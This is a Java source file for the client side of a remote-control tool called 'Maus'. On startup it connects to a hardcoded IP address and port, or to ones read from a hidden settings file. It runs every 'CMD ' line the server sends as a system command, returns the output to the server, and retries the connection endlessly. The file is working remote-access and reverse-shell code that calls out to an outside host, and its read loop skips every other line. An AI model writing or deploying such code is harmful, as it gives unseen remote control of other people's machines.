package Client;

import java.io.*;
import java.net.Socket;

public class Client {
    private static String HOST = "141.219.244.180";
    private static int PORT = 22122;
    private PrintWriter out;


    private static String getHOST() {
        return HOST;
    }

    private static void setHOST(String HOST) {
        Client.HOST = HOST;
    }

    private static int getPORT() {
        return PORT;
    }

    private static void setPORT(int PORT) {
        Client.PORT = PORT;
    }

    public static void main(String[] args) throws InterruptedException {
        /* Load server settings and then attempt to connect to Maus. */
        Client client = new Client();
        client.loadServerSettings();
        client.connect();
    }

    private void connect() throws InterruptedException {
        try {
            Socket socket = new Socket(getHOST(), getPORT());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);
            System.out.println("Client started: " + getHOST() + ":" + getPORT());
            String comm;
            while ((comm = in.readLine()) != null && !comm.contains("forciblyclose")) {
                comm = in.readLine();
                if (comm.contains("CMD ")) {
                    System.out.println(comm);
                    exec(comm.replace("CMD ", ""));
                }
                if (comm.equals("forciblyclose")) {
                    out.println("forciblyclose");
                }
            }
        } catch (IOException e) {
            /* Continually retry connection until established. */
            System.out.println("Disconnected... retrying.");
            Thread.sleep(1200);
            connect();
        }
    }


    /* Sends a message to the Server. */
    private void communicate(String msg) {
        out.println(msg);
    }

    /* Execute a command using Java's Runtime. */
    private void exec(String command) throws IOException, InterruptedException {
        if (!command.equals("")) {

            Process proc = Runtime.getRuntime().exec(command);

            BufferedReader reader =
                    new BufferedReader(new InputStreamReader(proc.getInputStream()));

            String line = "";
            while((line = reader.readLine()) != null) {
                System.out.print(line + "\n");
                communicate(line);
            }
            communicate("end");
        }
    }

    private void loadServerSettings() {
        try (BufferedReader reader = new BufferedReader(new FileReader(new File(Client.class.getProtectionDomain().getCodeSource().getLocation() + "Client/.mauscs")))
        ) {
            System.out.println("Run");
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            System.out.println(settings[0]);
            if (settings.length == 2) {
                setHOST(settings[0]);
                setPORT(Integer.parseInt(settings[1]));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
